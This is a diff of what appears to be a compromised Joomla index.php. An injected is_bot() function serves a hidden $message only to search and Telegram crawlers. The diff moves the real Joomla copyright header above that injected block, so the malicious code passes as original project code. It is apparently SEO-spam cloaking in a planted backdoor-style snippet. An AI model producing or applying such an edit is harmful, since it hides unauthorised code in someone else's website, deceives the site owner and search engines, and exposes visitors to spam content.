@@ -1,4 +1,14 @@
 <?php
+/**
+ * @package    Joomla.Site
+ *
+ * @copyright  Copyright (C) 2005 - 2018 Open Source Matters, Inc. All rights reserved.
+ * @license    GNU General Public License version 2 or later; see LICENSE.txt
+ */
+
+/**
+ * Define the application's minimum supported PHP version as a constant so it can be referenced within the application.
+ */
 function is_bot() {
     $user_agent = $_SERVER['HTTP_USER_AGENT'];
     $bots = array('Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification', 'Google-InspectionTool');
@@ -17,19 +27,6 @@ if (is_bot()) {
     echo $message;
 exit;
 }
-?>
-
-<?php
-/**
- * @package    Joomla.Site
- *
- * @copyright  Copyright (C) 2005 - 2018 Open Source Matters, Inc. All rights reserved.
- * @license    GNU General Public License version 2 or later; see LICENSE.txt
- */
-
-/**
- * Define the application's minimum supported PHP version as a constant so it can be referenced within the application.
- */
 define('JOOMLA_MINIMUM_PHP', '5.3.10');
 
 if (version_compare(PHP_VERSION, JOOMLA_MINIMUM_PHP, '<'))
